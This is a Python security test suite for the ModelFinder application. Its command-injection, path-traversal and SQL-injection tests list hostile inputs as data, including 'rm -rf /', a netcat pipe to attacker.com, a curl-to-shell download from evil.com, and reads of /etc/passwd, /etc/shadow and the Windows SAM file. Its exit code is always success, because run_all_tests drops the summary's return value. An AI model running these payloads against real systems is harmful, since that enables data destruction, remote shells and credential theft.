#!/usr/bin/env python3
"""
Security Test Suite for ModelFinder
Tests all security patches to ensure vulnerabilities are fixed
"""

import os
import sys
import sqlite3
import tempfile
import subprocess
from pathlib import Path
from typing import List, Tuple

# Import security module
from security_patch import (
    SecurityValidator,
    SecureFileOperations,
    SecureDatabase,
    SecureTempFile
)

class SecurityTestSuite:
    """Comprehensive security testing for ModelFinder"""
    
    def __init__(self):
        self.validator = SecurityValidator()
        self.passed = 0
        self.failed = 0
        self.tests = []
        
    def run_all_tests(self):
        """Run all security tests"""
        print("=" * 60)
        print("ModelFinder Security Test Suite")
        print("=" * 60)
        
        # Test categories
        self.test_command_injection()
        self.test_path_traversal()
        self.test_sql_injection()
        self.test_file_validation()
        self.test_temp_file_security()
        
        # Print summary
        self.print_summary()
        
    def test_command_injection(self):
        """Test command injection prevention"""
        print("\n1. COMMAND INJECTION TESTS")
        print("-" * 40)
        
        # Test malicious file paths
        malicious_paths = [
            "file.stl; rm -rf /",
            "file.stl && calc.exe",
            "file.stl | nc attacker.com 1234",
            "$(curl http://evil.com/shell.sh | sh)",
            "file.stl`whoami`",
            "file.stl;echo hacked > /etc/passwd",
        ]
        
        for path in malicious_paths:
            try:
                # Test path validation
                is_valid, result = self.validator.validate_path(path)
                
                if not is_valid:
                    self.passed += 1
                    print(f"  ✓ Blocked: {path[:30]}...")
                else:
                    self.failed += 1
                    print(f"  ✗ NOT BLOCKED: {path}")
                    
            except Exception as e:
                self.passed += 1
                print(f"  ✓ Exception caught: {path[:30]}...")
        
        # Test shell argument escaping
        print("\n  Testing shell argument escaping:")
        dangerous_args = [
            "normal.stl",
            "file with spaces.stl",
            "file;rm -rf /.stl",
            "file&&calc.exe.stl",
        ]
        
        for arg in dangerous_args:
            escaped = self.validator.escape_shell_arg(arg)
            
            # Check if dangerous characters are properly escaped
            if ';' in arg and ';' not in escaped:
                self.passed += 1
                print(f"  ✓ Properly escaped: {arg} -> {escaped}")
            elif '&&' in arg and '&&' not in escaped:
                self.passed += 1
                print(f"  ✓ Properly escaped: {arg} -> {escaped}")
            elif ';' not in arg and '&&' not in arg:
                self.passed += 1
                print(f"  ✓ Safe argument: {escaped}")
            else:
                self.failed += 1
                print(f"  ✗ Escaping failed: {arg} -> {escaped}")
    
    def test_path_traversal(self):
        """Test path traversal prevention"""
        print("\n2. PATH TRAVERSAL TESTS")
        print("-" * 40)
        
        # Create a test base directory
        with tempfile.TemporaryDirectory() as base_dir:
            
            # Test path traversal attempts
            traversal_attempts = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "models/../../../etc/shadow",
                "/etc/passwd",
                "C:\\Windows\\System32\\config\\SAM",
                "file://etc/passwd",
                "models/../../sensitive_data",
            ]
            
            for attempt in traversal_attempts:
                is_valid, result = self.validator.validate_path(attempt, base_dir)
                
                if not is_valid:
                    self.passed += 1
                    print(f"  ✓ Blocked traversal: {attempt}")
                else:
                    self.failed += 1
                    print(f"  ✗ NOT BLOCKED: {attempt}")
            
            # Test symlink attacks
            print("\n  Testing symlink attack prevention:")
            
            # Create a test file and symlink
            test_file = Path(base_dir) / "test.stl"
            test_file.write_text("test")
            
            symlink = Path(base_dir) / "symlink.stl"
            outside_target = Path("/etc/passwd")
            
            if sys.platform != "win32" and outside_target.exists():
                try:
                    symlink.symlink_to(outside_target)
                    
                    # Test if symlink to outside directory is blocked
                    is_valid, result = self.validator.validate_path(str(symlink), base_dir)
                    
                    if not is_valid:
                        self.passed += 1
                        print(f"  ✓ Blocked symlink to: {outside_target}")
                    else:
                        self.failed += 1
                        print(f"  ✗ Symlink not blocked: {outside_target}")
                        
                except Exception:
                    print("  ⚠ Symlink test skipped (permission denied)")
    
    def test_sql_injection(self):
        """Test SQL injection prevention"""
        print("\n3. SQL INJECTION TESTS")
        print("-" * 40)
        
        # Create test database
        with tempfile.NamedTemporaryFile(suffix='.db', delete=False) as tmp_db:
            db_path = tmp_db.name
            
        try:
            # Initialize secure database
            db = SecureDatabase(db_path)
            db.connect()
            
            # Create test table
            db.connection.execute("""
                CREATE TABLE models (
                    id INTEGER PRIMARY KEY,
                    name TEXT,
                    tags TEXT
                )
            """)
            
            # Insert test data
            db.connection.execute(
                "INSERT INTO models (name, tags) VALUES (?, ?)",
                ("test.stl", "3d model")
            )
            db.connection.commit()
            
            # Test SQL injection attempts
            injection_attempts = [
                "'; DROP TABLE models; --",
                "' OR '1'='1",
                "admin'--",
                "1' UNION SELECT * FROM models--",
                "'; UPDATE models SET name='hacked'; --",
            ]
            
            for injection in injection_attempts:
                try:
                    # Test search with injection attempt
                    results = db.search_files(injection)
                    
                    # Check if table still exists (not dropped)
                    cursor = db.connection.execute(
                        "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='models'"
                    )
                    
                    if cursor.fetchone()[0] == 1:
                        self.passed += 1
                        print(f"  ✓ Injection blocked: {injection[:30]}...")
                    else:
                        self.failed += 1
                        print(f"  ✗ TABLE DROPPED: {injection}")
                        
                except Exception as e:
                    # Exception is good - means injection was prevented
                    self.passed += 1
                    print(f"  ✓ Exception prevented injection: {injection[:30]}...")
            
            # Test identifier sanitization
            print("\n  Testing SQL identifier sanitization:")
            
            dangerous_identifiers = [
                "users; DROP TABLE models",
                "col' OR '1'='1",
                "123_start_with_number",
            ]
            
            for identifier in dangerous_identifiers:
                sanitized = self.validator.sanitize_sql_identifier(identifier)
                
                # Check if dangerous characters removed
                if ';' not in sanitized and "'" not in sanitized:
                    self.passed += 1
                    print(f"  ✓ Sanitized: {identifier} -> {sanitized}")
                else:
                    self.failed += 1
                    print(f"  ✗ Not sanitized: {identifier} -> {sanitized}")
            
            db.close()
            
        finally:
            # Clean up
            if os.path.exists(db_path):
                os.unlink(db_path)
    
    def test_file_validation(self):
        """Test file validation and upload restrictions"""
        print("\n4. FILE VALIDATION TESTS")
        print("-" * 40)
        
        # Test file extension validation
        print("  Testing file extension validation:")
        
        test_files = [
            ("model.stl", True),
            ("model.obj", True),
            ("model.fbx", True),
            ("malware.exe", False),
            ("script.bat", False),
            ("backdoor.php", False),
            ("shell.jsp", False),
        ]
        
        for filename, should_pass in test_files:
            is_valid = self.validator.validate_file_extension(filename)
            
            if is_valid == should_pass:
                self.passed += 1
                status = "✓ Allowed" if is_valid else "✓ Blocked"
                print(f"  {status}: {filename}")
            else:
                self.failed += 1
                status = "✗ Should block" if should_pass else "✗ Should allow"
                print(f"  {status}: {filename}")
        
        # Test file size validation
        print("\n  Testing file size limits:")
        
        MAX_SIZE = 500 * 1024 * 1024  # 500 MB
        
        test_sizes = [
            (100 * 1024 * 1024, True),   # 100 MB - OK
            (499 * 1024 * 1024, True),   # 499 MB - OK
            (501 * 1024 * 1024, False),  # 501 MB - Too large
            (1024 * 1024 * 1024, False), # 1 GB - Too large
        ]
        
        for size, should_pass in test_sizes:
            is_valid = size <= MAX_SIZE
            
            if is_valid == should_pass:
                self.passed += 1
                status = "✓ Accepted" if is_valid else "✓ Rejected"
                print(f"  {status}: {size // (1024*1024)} MB")
            else:
                self.failed += 1
                print(f"  ✗ Wrong decision for: {size // (1024*1024)} MB")
    
    def test_temp_file_security(self):
        """Test temporary file security"""
        print("\n5. TEMPORARY FILE SECURITY TESTS")
        print("-" * 40)
        
        # Test secure temp file creation
        print("  Testing secure temp file creation:")
        
        try:
            # Create secure temp file
            temp_file = SecureTempFile.create_temp_file(suffix='.stl')
            
            if os.path.exists(temp_file):
                self.passed += 1
                print(f"  ✓ Created temp file: {temp_file}")
                
                # Check permissions (Unix-like systems)
                if hasattr(os, 'stat'):
                    import stat
                    file_stat = os.stat(temp_file)
                    mode = file_stat.st_mode
                    
                    # Check if only owner has read/write
                    if sys.platform != "win32":
                        owner_only = (mode & stat.S_IRWXG == 0) and (mode & stat.S_IRWXO == 0)
                        
                        if owner_only:
                            self.passed += 1
                            print(f"  ✓ Secure permissions set (owner only)")
                        else:
                            self.failed += 1
                            print(f"  ✗ Insecure permissions: {oct(mode)}")
                
                # Clean up
                os.unlink(temp_file)
            else:
                self.failed += 1
                print(f"  ✗ Failed to create temp file")
                
        except Exception as e:
            self.failed += 1
            print(f"  ✗ Error creating temp file: {e}")
        
        # Test secure temp directory
        print("\n  Testing secure temp directory creation:")
        
        try:
            # Create secure temp directory
            temp_dir = SecureTempFile.secure_temp_dir()
            
            if os.path.exists(temp_dir):
                self.passed += 1
                print(f"  ✓ Created temp directory: {temp_dir}")
                
                # Check permissions
                if hasattr(os, 'stat'):
                    import stat
                    dir_stat = os.stat(temp_dir)
                    mode = dir_stat.st_mode
                    
                    if sys.platform != "win32":
                        # Check if only owner has full access
                        owner_only = (mode & stat.S_IRWXG == 0) and (mode & stat.S_IRWXO == 0)
                        
                        if owner_only:
                            self.passed += 1
                            print(f"  ✓ Secure directory permissions (700)")
                        else:
                            self.failed += 1
                            print(f"  ✗ Insecure directory permissions: {oct(mode)}")
                
                # Clean up
                import shutil
                shutil.rmtree(temp_dir)
            else:
                self.failed += 1
                print(f"  ✗ Failed to create temp directory")
                
        except Exception as e:
            self.failed += 1
            print(f"  ✗ Error creating temp directory: {e}")
    
    def print_summary(self):
        """Print test summary"""
        print("\n" + "=" * 60)
        print("TEST SUMMARY")
        print("=" * 60)
        
        total = self.passed + self.failed
        
        print(f"Total Tests: {total}")
        print(f"Passed: {self.passed} ✓")
        print(f"Failed: {self.failed} ✗")
        
        if total > 0:
            pass_rate = (self.passed / total) * 100
            print(f"Pass Rate: {pass_rate:.1f}%")
            
            if self.failed == 0:
                print("\n🎉 ALL SECURITY TESTS PASSED! 🎉")
                print("The application is protected against tested vulnerabilities.")
            else:
                print(f"\n⚠️ WARNING: {self.failed} security test(s) failed!")
                print("Please fix the failing tests before deployment.")
        
        print("=" * 60)
        
        # Return exit code
        return 0 if self.failed == 0 else 1


def main():
    """Run the security test suite"""
    tester = SecurityTestSuite()
    exit_code = tester.run_all_tests()
    sys.exit(exit_code)


if __name__ == "__main__":
    main()
